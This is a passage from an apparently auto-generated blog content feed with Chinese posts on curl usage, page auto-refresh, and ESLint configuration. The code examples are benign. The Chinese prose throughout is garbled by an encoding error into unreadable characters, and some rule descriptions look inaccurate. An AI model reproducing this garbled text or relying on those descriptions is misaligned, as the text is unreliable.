&lt;num&gt;                         æŒ‡å®šé‡è¯•æ¬¡æ•°</span><br><span class="line">--retry-delay SECONDS                 When retrying, wait this many seconds between each</span><br><span class="line">--retry-max-time SECONDS              Retry only within this period&gt;</span><br><span class="line">--raw                                 raw response</span><br></pre></td></tr></table></figure><h3 id="ç¤ºä¾‹"><a href="#ç¤ºä¾‹" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">curl -X GET &#x27;http:/example.com/_search?pretty=true&#x27; -d &#x27; </span><br><span class="line">&#123;</span><br><span class="line">    &quot;query&quot;: &#123;</span><br><span class="line">        &quot;match&quot;: &#123;</span><br><span class="line">            &quot;title&quot;: &#123;</span><br><span class="line">                &quot;query&quot;: &quot;ç™½é¹¿åŸ&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; &#x27;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST --cookie &quot;token:abc;sesson_id:def&quot; --header &quot;HOST: www.baidu.com&quot; --header &quot;Content-Length: 0&quot; http://127.0.0.1/dopost</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -svo /dev/null &#x27;https://www.baidu.com&#x27; --resolve www.baidu.com:443:127.0.0.1</span><br></pre></td></tr></table></figure><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="http://dbajun.iteye.com/blog/1813801">Linuxå‘½ä»¤ä¹‹curl - å¼ºå¤§çš„ç½‘ç»œä¼ è¾“å·¥å…·</a></li><li><a href="http://ju.outofmemory.cn/entry/84875">ä½¿ç”¨curlæŒ‡ä»¤æ¸¬è©¦RESTæœå‹™</a></li><li><a href="http://cizixs.com/2014/05/14/curl-automate-http">curlè‡ªåŠ¨åŒ–httpæ“ä½œ</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> curl </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é¡µé¢è‡ªåŠ¨åˆ·æ–°</title>
      <link href="/post/page-auto-refresh.html"/>
      <url>/post/page-auto-refresh.html</url>
      
        <content type="html"><![CDATA[<h3 id="é¡µé¢è‡ªåŠ¨åˆ·æ–°"><a href="#é¡µé¢è‡ªåŠ¨åˆ·æ–°" class="headerlink" title="é¡µé¢è‡ªåŠ¨åˆ·æ–°"></a>é¡µé¢è‡ªåŠ¨åˆ·æ–°</h3><p>1.é¡µé¢è‡ªåŠ¨åˆ·æ–°ï¼šæŠŠå¦‚ä¸‹ä»£ç åŠ å…¥<head>åŒºåŸŸä¸­</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;refresh&quot;</span> <span class="attr">content</span>=<span class="string">&quot;20&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å…¶ä¸­20æŒ‡æ¯éš”20ç§’åˆ·æ–°ä¸€æ¬¡é¡µé¢.</p><p>2.é¡µé¢è‡ªåŠ¨è·³è½¬ï¼š æŠŠå¦‚ä¸‹ä»£ç åŠ å…¥<head>åŒºåŸŸä¸­</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;refresh&quot;</span> <span class="attr">content</span>=<span class="string">&quot;20; URL=http://www.baidu.com&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å…¶ä¸­20æŒ‡éš”20ç§’åè·³è½¬åˆ°<code>http://www.baidu.com</code>é¡µé¢</p><p>3.é¡µé¢è‡ªåŠ¨åˆ·æ–°jsç‰ˆ</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">refresh</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">location</span>.<span class="title function_">reload</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">setTimeout</span>(refresh, <span class="number">1000</span>);</span><br></pre></td></tr></table></figure><p>&#x2F;&#x2F; æŒ‡å®š1ç§’åˆ·æ–°ä¸€æ¬¡</script></p><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><p><a href="http://www.cnblogs.com/lhws/archive/2012/03/05/2380249.html">ã€1ã€‘</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ESLint</title>
      <link href="/post/eslint.html"/>
      <url>/post/eslint.html</url>
      
        <content type="html"><![CDATA[<h2 id="ESLint"><a href="#ESLint" class="headerlink" title="ESLint"></a>ESLint</h2><p>ä»¥å‰æˆ‘ä»¬éƒ½ç”¨JSLintï¼Œä»ES6å‘å¸ƒåå¤§éƒ¨åˆ†äººå¼€å§‹ä½¿ç”¨ESLintã€‚</p><h3 id="é…ç½®"><a href="#é…ç½®" class="headerlink" title="é…ç½®"></a>é…ç½®</h3><p>ESLintæ”¯æŒjsonã€ymlç­‰æ ¼å¼çš„é…ç½®æ–‡ä»¶ã€‚é…ç½®å¯ç»§æ‰¿ï¼Œç¦»æ–‡ä»¶è¶Šè¿‘çš„çš„é…ç½®ä¼˜å…ˆçº§è¶Šé«˜ã€‚é…ç½®ä¸»è¦æœ‰ä¸‰éƒ¨åˆ†ï¼š</p><ul><li>Environments - æŒ‡å®šè„šæœ¬çš„è¿è¡Œç¯å¢ƒã€‚æ¯ç§ç¯å¢ƒéƒ½æœ‰ä¸€ç»„ç‰¹å®šçš„é¢„å®šä¹‰å…¨å±€å˜é‡ã€‚</li><li>Globals - è„šæœ¬åœ¨æ‰§è¡ŒæœŸé—´è®¿é—®çš„é¢å¤–çš„å…¨å±€å˜é‡ã€‚</li><li>Rules - å¯ç”¨çš„è§„åˆ™åŠå…¶å„è‡ªçš„é”™è¯¯çº§åˆ«ã€‚</li></ul><p>ä¸€ä¸ªå¸¸è§çš„é…ç½®ï¼š</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">env:</span></span><br><span class="line">  <span class="attr">node:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">commonjs:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">es6:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">mocha:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">extends:</span> </span><br><span class="line">  <span class="bullet">-</span> <span class="string">&#x27;eslint:recommended&#x27;</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&#x27;plugin:node/recommended&#x27;</span></span><br><span class="line"><span class="attr">parserOptions:</span></span><br><span class="line">  <span class="attr">ecmaVersion:</span> <span class="number">2018</span></span><br><span class="line">  <span class="attr">sourceType:</span> <span class="string">module</span></span><br><span class="line"><span class="attr">rules:</span></span><br><span class="line">  <span class="attr">indent:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">error</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">tab</span></span><br><span class="line">  <span class="attr">linebreak-style:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">error</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">unix</span></span><br><span class="line">  <span class="attr">quotes:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">error</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">single</span></span><br><span class="line">  <span class="attr">semi:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">error</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">always</span></span><br><span class="line">  <span class="attr">no-unused-vars:</span> </span><br><span class="line">    <span class="bullet">-</span> <span class="string">off</span></span><br></pre></td></tr></table></figure><p>é™¤äº†é…ç½®æ–‡ä»¶ï¼Œåœ¨æŸäº›ç‰¹æ®Šæƒ…å†µä¸‹eslintè¿˜æ”¯æŒæ³¨é‡Šå½¢å¼é…ç½®ï¼Œè¿™ç§ä¼˜å…ˆçº§æœ€é«˜ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">const</span> rule <span class="keyword">of</span> rules) &#123;</span><br><span class="line"><span class="comment">/* eslint no-empty:0 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬è¿˜å¯ä»¥æŒ‡å®šä¸€ä¸ªå¿½ç•¥æ–‡ä»¶<code>.eslintignore</code>ï¼Œå‘Šè¯‰eslintå“ªäº›æ–‡ä»¶æ’é™¤æ ¡éªŒã€‚</p><p>å¸¸è§çš„ç»“æ„ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">â”œâ”€â”€ src</span><br><span class="line">â”‚Â Â  â””â”€â”€ ...</span><br><span class="line">â”œâ”€â”€ test</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ .eslintrc.yml</span><br><span class="line">â”‚Â Â  â””â”€â”€ ...</span><br><span class="line">â”œâ”€â”€ .eslintignore</span><br><span class="line">â”œâ”€â”€ .eslintrc.yml</span><br><span class="line">â””â”€â”€ ...</span><br></pre></td></tr></table></figure><h3 id="è§„åˆ™çš„é”™è¯¯ç­‰çº§"><a href="#è§„åˆ™çš„é”™è¯¯ç­‰çº§" class="headerlink" title="è§„åˆ™çš„é”™è¯¯ç­‰çº§"></a>è§„åˆ™çš„é”™è¯¯ç­‰çº§</h3><ul><li>â€œoffâ€ æˆ– 0 - å…³é—­è§„åˆ™</li><li>â€œwarnâ€ æˆ– 1 - å¼€å¯è§„åˆ™ï¼Œä½¿ç”¨è­¦å‘Šçº§åˆ«çš„é”™è¯¯ï¼šwarn (ä¸ä¼šå¯¼è‡´ç¨‹åºé€€å‡º),</li><li>â€œerrorâ€ æˆ– 2 - å¼€å¯è§„åˆ™ï¼Œä½¿ç”¨é”™è¯¯çº§åˆ«çš„é”™è¯¯ï¼šerror (å½“è¢«è§¦å‘çš„æ—¶å€™ï¼Œç¨‹åºä¼šé€€å‡º)</li></ul><h3 id="å¸¸è§çš„è§„åˆ™è¯´æ˜"><a href="#å¸¸è§çš„è§„åˆ™è¯´æ˜" class="headerlink" title="å¸¸è§çš„è§„åˆ™è¯´æ˜"></a>å¸¸è§çš„è§„åˆ™è¯´æ˜</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br></pre></td><td class="code"><pre><span class="line">&quot;no-alert&quot;: 0,//ç¦æ­¢ä½¿ç”¨alert confirm prompt</span><br><span class="line">&quot;no-array-constructor&quot;: 2,//ç¦æ­¢ä½¿ç”¨æ•°ç»„æ„é€ å™¨</span><br><span class="line">&quot;no-bitwise&quot;: 0,//ç¦æ­¢ä½¿ç”¨æŒ‰ä½è¿ç®—ç¬¦</span><br><span class="line">&quot;no-caller&quot;: 1,//ç¦æ­¢ä½¿ç”¨arguments.calleræˆ–arguments.callee</span><br><span class="line">&quot;no-catch-shadow&quot;: 2,//ç¦æ­¢catchå­å¥å‚æ•°ä¸å¤–éƒ¨ä½œç”¨åŸŸå˜é‡åŒå</span><br><span class="line">&quot;no-class-assign&quot;: 2,//ç¦æ­¢ç»™ç±»èµ‹å€¼</span><br><span class="line">&quot;no-cond-assign&quot;: 2,//ç¦æ­¢åœ¨æ¡ä»¶è¡¨è¾¾å¼ä¸­ä½¿ç”¨èµ‹å€¼è¯­å¥</span><br><span class="line">&quot;no-console&quot;: 2,//ç¦æ­¢ä½¿ç”¨console</span><br><span class="line">&quot;no-const-assign&quot;: 2,//ç¦æ­¢ä¿®æ”¹constå£°æ˜çš„å˜é‡</span><br><span class="line">&quot;no-constant-condition&quot;: 2,//ç¦æ­¢åœ¨æ¡ä»¶ä¸­ä½¿ç”¨å¸¸é‡è¡¨è¾¾å¼ if(true) if(1)</span><br><span class="line">&quot;no-continue&quot;: 0,//ç¦æ­¢ä½¿ç”¨continue</span><br><span class="line">&quot;no-control-regex&quot;: 2,//ç¦æ­¢åœ¨æ­£åˆ™è¡¨è¾¾å¼ä¸­ä½¿ç”¨æ§åˆ¶å­—ç¬¦</span><br><span class="line">&quot;no-debugger&quot;: 2,//ç¦æ­¢ä½¿ç”¨debugger</span><br><span class="line">&quot;no-delete-var&quot;: 2,//ä¸èƒ½å¯¹varå£°æ˜çš„å˜é‡ä½¿ç”¨deleteæ“ä½œç¬¦</span><br><span class="line">&quot;no-div-regex&quot;: 1,//ä¸èƒ½ä½¿ç”¨çœ‹èµ·æ¥åƒé™¤æ³•çš„æ­£åˆ™è¡¨è¾¾å¼/=foo/</span><br><span class="line">&quot;no-dupe-keys&quot;: 2,//åœ¨åˆ›å»ºå¯¹è±¡å­—é¢é‡æ—¶ä¸å…è®¸é”®é‡å¤ &#123;a:1,a:1&#125;</span><br><span class="line">&quot;no-dupe-args&quot;: 2,//å‡½æ•°å‚æ•°ä¸èƒ½é‡å¤</span><br><span class="line">&quot;no-duplicate-case&quot;: 2,//switchä¸­çš„caseæ ‡ç­¾ä¸èƒ½é‡å¤</span><br><span class="line">&quot;no-else-return&quot;: 2,//å¦‚æœifè¯­å¥é‡Œé¢æœ‰return,åé¢ä¸èƒ½è·Ÿelseè¯­å¥</span><br><span class="line">&quot;no-empty&quot;: 2,//å—è¯­å¥ä¸­çš„å†…å®¹ä¸èƒ½ä¸ºç©º</span><br><span class="line">&quot;no-empty-character-class&quot;: 2,//æ­£åˆ™è¡¨è¾¾å¼ä¸­çš„[]å†…å®¹ä¸èƒ½ä¸ºç©º</span><br><span class="line">&quot;no-empty-label&quot;: 2,//ç¦æ­¢ä½¿ç”¨ç©ºlabel</span><br><span class="line">&quot;no-eq-null&quot;: 2,//ç¦æ­¢å¯¹nullä½¿ç”¨==æˆ–!=è¿ç®—ç¬¦</span><br><span class="line">&quot;no-eval&quot;: 1,//ç¦æ­¢ä½¿ç”¨eval</span><br><span class="line">&quot;no-ex-assign&quot;: 2,//ç¦æ­¢ç»™catchè¯­å¥ä¸­çš„å¼‚å¸¸å‚æ•°èµ‹å€¼</span><br><span class="line">&quot;no-extend-native&quot;: 2,//ç¦æ­¢æ‰©å±•nativeå¯¹è±¡</span><br><span class="line">&quot;no-extra-bind&quot;: 2,//ç¦æ­¢ä¸å¿…è¦çš„å‡½æ•°ç»‘å®š</span><br><span class="line">&quot;no-extra-boolean-cast&quot;: 2,//ç¦æ­¢ä¸å¿…è¦çš„boolè½¬æ¢</span><br><span class="line">&quot;no-extra-parens&quot;: 2,//ç¦æ­¢éå¿…è¦çš„æ‹¬å·</span><br><span class="line">&quot;no-extra-semi&quot;: 2,//ç¦æ­¢å¤šä½™çš„å†’å·</span><br><span class="line">&quot;no-fallthrough&quot;: 1,//ç¦æ­¢switchç©¿é€</span><br><span class="line">&quot;no-floating-decimal&quot;: 2,//ç¦æ­¢çœç•¥æµ®ç‚¹æ•°ä¸­çš„0 .5 3.</span><br><span class="line">&quot;no-func-assign&quot;: 2,//ç¦æ­¢é‡å¤çš„å‡½æ•°å£°æ˜</span><br><span class="line">&quot;no-implicit-coercion&quot;: 1,//ç¦æ­¢éšå¼è½¬æ¢</span><br><span class="line">&quot;no-implied-eval&quot;: 2,//ç¦æ­¢ä½¿ç”¨éšå¼eval</span><br><span class="line">&quot;no-inline-comments&quot;: 0,//ç¦æ­¢è¡Œå†…å¤‡æ³¨</span><br><span class="line">&quot;no-inner-declarations&quot;: [2, &quot;functions&quot;],//ç¦æ­¢åœ¨å—è¯­å¥ä¸­ä½¿ç”¨å£°æ˜ï¼ˆå˜é‡æˆ–å‡½æ•°ï¼‰</span><br><span class="line">&quot;no-invalid-regexp&quot;: 2,//ç¦æ­¢æ— æ•ˆçš„æ­£åˆ™è¡¨è¾¾å¼</span><br><span class="line">&quot;no-invalid-this&quot;: 2,//ç¦æ­¢æ— æ•ˆçš„thisï¼Œåªèƒ½ç”¨åœ¨æ„é€ å™¨ï¼Œç±»ï¼Œå¯¹è±¡å­—é¢é‡</span><br><span class="line">&quot;no-irregular-whitespace&quot;: 2,//ä¸èƒ½æœ‰ä¸è§„åˆ™çš„ç©ºæ ¼</span><br><span class="line">&quot;no-iterator&quot;: 2,//ç¦æ­¢ä½¿ç”¨__iterator__ å±æ€§</span><br><span class="line">&quot;no-label-var&quot;: 2,//labelåä¸èƒ½ä¸varå£°æ˜çš„å˜é‡åç›¸åŒ</span><br><span class="line">&quot;no-labels&quot;: 2,//ç¦æ­¢æ ‡ç­¾å£°æ˜</span><br><span class="line">&quot;no-lone-blocks&quot;: 2,//ç¦æ­¢ä¸å¿…è¦çš„åµŒå¥—å—</span><br><span class="line">&quot;no-lonely-if&quot;: 2,//ç¦æ­¢elseè¯­å¥å†…åªæœ‰ifè¯­å¥</span><br><span class="line">&quot;no-loop-func&quot;: 1,//ç¦æ­¢åœ¨å¾ªç¯ä¸­ä½¿ç”¨å‡½æ•°ï¼ˆå¦‚æœæ²¡æœ‰å¼•ç”¨å¤–éƒ¨å˜é‡ä¸å½¢æˆé—­åŒ…å°±å¯ä»¥ï¼‰</span><br><span class="line">&quot;no-mixed-requires&quot;: [0, false],//å£°æ˜æ—¶ä¸èƒ½æ··ç”¨å£°æ˜ç±»å‹</span><br><span class="line">&quot;no-mixed-spaces-and-tabs&quot;: [2, false],//ç¦æ­¢æ··ç”¨tabå’Œç©ºæ ¼</span><br><span class="line">&quot;linebreak-style&quot;: [0, &quot;windows&quot;],//æ¢è¡Œé£æ ¼</span><br><span class="line">&quot;no-multi-spaces&quot;: 1,//ä¸èƒ½ç”¨å¤šä½™çš„ç©ºæ ¼</span><br><span class="line">&quot;no-multi-str&quot;: 2,//å­—ç¬¦ä¸²ä¸èƒ½ç”¨\æ¢è¡Œ</span><br><span class="line">&quot;no-multiple-empty-lines&quot;: [1, &#123;&quot;max&quot;: 2&#125;],//ç©ºè¡Œæœ€å¤šä¸èƒ½è¶…è¿‡2è¡Œ</span><br><span class="line">&quot;no-native-reassign&quot;: 2,//ä¸èƒ½é‡å†™nativeå¯¹è±¡</span><br><span class="line">&quot;no-negated-in-lhs&quot;: 2,//in æ“ä½œç¬¦çš„å·¦è¾¹ä¸èƒ½æœ‰!</span><br><span class="line">&quot;no-nested-ternary&quot;: 0,//ç¦æ­¢ä½¿ç”¨åµŒå¥—çš„ä¸‰ç›®è¿ç®—</span><br><span class="line">&quot;no-new&quot;: 1,//ç¦æ­¢åœ¨ä½¿ç”¨newæ„é€ ä¸€ä¸ªå®ä¾‹åä¸èµ‹å€¼</span><br><span class="line">&quot;no-new-func&quot;: 1,//ç¦æ­¢ä½¿ç”¨new Function</span><br><span class="line">&quot;no-new-object&quot;: 2,//ç¦æ­¢ä½¿ç”¨new Object()</span><br><span class="line">&quot;no-new-require&quot;: 2,//ç¦æ­¢ä½¿ç”¨new require</span><br><span class="line">&quot;no-new-wrappers&quot;: 2,//ç¦æ­¢ä½¿ç”¨newåˆ›å»ºåŒ…è£…å®ä¾‹ï¼Œnew String new Boolean new Number</span><br><span class="line">&quot;no-obj-calls&quot;: 2,//ä¸èƒ½è°ƒç”¨å†…ç½®çš„å…¨å±€å¯¹è±¡ï¼Œæ¯”å¦‚Math() JSON()</span><br><span class="line">&quot;no-octal&quot;: 2,//ç¦æ­¢ä½¿ç”¨å…«è¿›åˆ¶æ•°å­—</span><br><span class="line">&quot;no-octal-escape&quot;: 2,//ç¦æ­¢ä½¿ç”¨å…«è¿›åˆ¶è½¬ä¹‰åºåˆ—</span><br><span class="line">&quot;no-param-reassign&quot;: 2,//ç¦æ­¢ç»™å‚æ•°é‡æ–°èµ‹å€¼</span><br><span class="line">&quot;no-path-concat&quot;: 0,//nodeä¸­ä¸èƒ½ä½¿ç”¨__dirnameæˆ–__filenameåšè·¯å¾„æ‹¼æ¥</span><br><span class="line">&quot;no-plusplus&quot;: 0,//ç¦æ­¢ä½¿ç”¨++ï¼Œ--</span><br><span class="line">&quot;no-process-env&quot;: 0,//ç¦æ­¢ä½¿ç”¨process.env</span><br><span class="line">&quot;no-process-exit&quot;: 0,//ç¦æ­¢ä½¿ç”¨process.exit()</span><br><span class="line">&quot;no-proto&quot;: 2,//ç¦æ­¢ä½¿ç”¨__proto__å±æ€§</span><br><span class="line">&quot;no-redeclare&quot;: 2,//ç¦æ­¢é‡å¤å£°æ˜å˜é‡</span><br><span class="line">&quot;no-regex-spaces&quot;: 2,//ç¦æ­¢åœ¨æ­£åˆ™è¡¨è¾¾å¼å­—é¢é‡ä¸­ä½¿ç”¨å¤šä¸ªç©ºæ ¼ /foo bar/</span><br><span class="line">&quot;no-restricted-modules&quot;: 0,//å¦‚æœç¦ç”¨äº†æŒ‡å®šæ¨¡å—ï¼Œä½¿ç”¨å°±ä¼šæŠ¥é”™</span><br><span class="line">&quot;no-return-assign&quot;: 1,//return è¯­å¥ä¸­ä¸èƒ½æœ‰èµ‹å€¼è¡¨è¾¾å¼</span><br><span class="line">&quot;no-script-url&quot;: 0,//ç¦æ­¢ä½¿ç”¨javascript:void(0)</span><br><span class="line">&quot;no-self-compare&quot;: 2,//ä¸èƒ½æ¯”è¾ƒè‡ªèº«</span><br><span class="line">&quot;no-sequences&quot;: 0,//ç¦æ­¢ä½¿ç”¨é€—å·è¿ç®—ç¬¦</span><br><span class="line">&quot;no-shadow&quot;: 2,//å¤–éƒ¨ä½œç”¨åŸŸä¸­çš„å˜é‡ä¸èƒ½ä¸å®ƒæ‰€åŒ…å«çš„ä½œç”¨åŸŸä¸­çš„å˜é‡æˆ–å‚æ•°åŒå</span><br><span class="line">&quot;no-shadow-restricted-names&quot;: 2,//ä¸¥æ ¼æ¨¡å¼ä¸­è§„å®šçš„é™åˆ¶æ ‡è¯†ç¬¦ä¸èƒ½ä½œä¸ºå£°æ˜æ—¶çš„å˜é‡åä½¿ç”¨</span><br><span class="line">&quot;no-spaced-func&quot;: 2,//å‡½æ•°è°ƒç”¨æ—¶ å‡½æ•°åä¸()ä¹‹é—´ä¸èƒ½æœ‰ç©ºæ ¼</span><br><span class="line">&quot;no-sparse-arrays&quot;: 2,//ç¦æ­¢ç¨€ç–æ•°ç»„ï¼Œ [1,,2]</span><br><span class="line">&quot;no-sync&quot;: 0,//nodejs ç¦æ­¢åŒæ­¥æ–¹æ³•</span><br><span class="line">&quot;no-ternary&quot;: 0,//ç¦æ­¢ä½¿ç”¨ä¸‰ç›®è¿ç®—ç¬¦</span><br><span class="line">&quot;no-trailing-spaces&quot;: 1,//ä¸€è¡Œç»“æŸåé¢ä¸è¦æœ‰ç©ºæ ¼</span><br><span class="line">&quot;no-this-before-super&quot;: 0,//åœ¨è°ƒç”¨super()ä¹‹å‰ä¸èƒ½ä½¿ç”¨thisæˆ–super</span><br><span class="line">&quot;no-throw-literal&quot;: 2,//ç¦æ­¢æŠ›å‡ºå­—é¢é‡é”™è¯¯ throw &quot;error&quot;;</span><br><span class="line">&quot;no-undef&quot;: 1,//ä¸èƒ½æœ‰æœªå®šä¹‰çš„å˜é‡</span><br><span class="line">&quot;no-undef-init&quot;: 2,//å˜é‡åˆå§‹åŒ–æ—¶ä¸èƒ½ç›´æ¥ç»™å®ƒèµ‹å€¼ä¸ºundefined</span><br><span class="line">&quot;no-undefined&quot;: 2,//ä¸èƒ½ä½¿ç”¨undefined</span><br><span class="line">&quot;no-unexpected-multiline&quot;: 2,//é¿å…å¤šè¡Œè¡¨è¾¾å¼</span><br><span class="line">&quot;no-underscore-dangle&quot;: 1,//æ ‡è¯†ç¬¦ä¸èƒ½ä»¥_å¼€å¤´æˆ–ç»“å°¾</span><br><span class="line">&quot;no-unneeded-ternary&quot;: 2,//ç¦æ­¢ä¸å¿…è¦çš„åµŒå¥— var isYes = answer === 1 ? true : false;</span><br><span class="line">&quot;no-unreachable&quot;: 2,//ä¸èƒ½æœ‰æ— æ³•æ‰§è¡Œçš„ä»£ç </span><br><span class="line">&quot;no-unused-expressions&quot;: 2,//ç¦æ­¢æ— ç”¨çš„è¡¨è¾¾å¼</span><br><span class="line">&quot;no-unused-vars&quot;: [2, &#123;&quot;vars&quot;: &quot;all&quot;, &quot;args&quot;: &quot;after-used&quot;&#125;],//ä¸èƒ½æœ‰å£°æ˜åæœªè¢«ä½¿ç”¨çš„å˜é‡æˆ–å‚æ•°</span><br><span class="line">&quot;no-use-before-define&quot;: 